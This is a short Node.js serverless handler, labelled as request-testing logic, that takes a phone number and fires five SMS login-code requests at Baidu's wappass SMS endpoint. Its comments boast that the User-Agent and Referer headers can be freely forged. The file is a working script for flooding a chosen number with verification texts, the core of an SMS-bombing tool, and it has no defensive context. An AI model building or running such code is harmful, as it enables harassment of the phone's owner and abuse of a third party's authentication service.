// 林少的接口请求测试逻辑 (后端 Node.js 版)
export default async function handler(req, res) {
    // 只允许 POST 请求
    if (req.method !== 'POST') {
        return res.status(405).json({ error: '只允许 POST 请求' });
    }

    const phone = req.body.phone;
    if (!phone) {
        return res.status(400).json({ error: '缺少手机号码' });
    }

    const url = "https://wappass.baidu.com/wp/api/login/sms";
    
    // 在后端服务器环境中，我们可以自由伪造任何 Headers，不受浏览器限制
    const headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://wappass.baidu.com/wp/api/security/getphonestatus",
        "Content-Type": "application/x-www-form-urlencoded"
    };

    const payload = new URLSearchParams();
    payload.append('phone', phone);
    payload.append('tpl', 'sms');

    let successCount = 0;

    for (let i = 0; i < 5; i++) {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: payload.toString()
            });

            if (response.ok) {
                successCount++;
                console.log(`第 ${i + 1} 次发送成功`);
            } else {
                console.log(`第 ${i + 1} 次发送失败，状态码: ${response.status}`);
            }
        } catch (error) {
            console.error(`请求异常: ${error}`);
        }
    }

    // 将结果返回给你的前端网页
    return res.status(200).json({ message: `任务完成，成功 ${successCount} 次` });
}
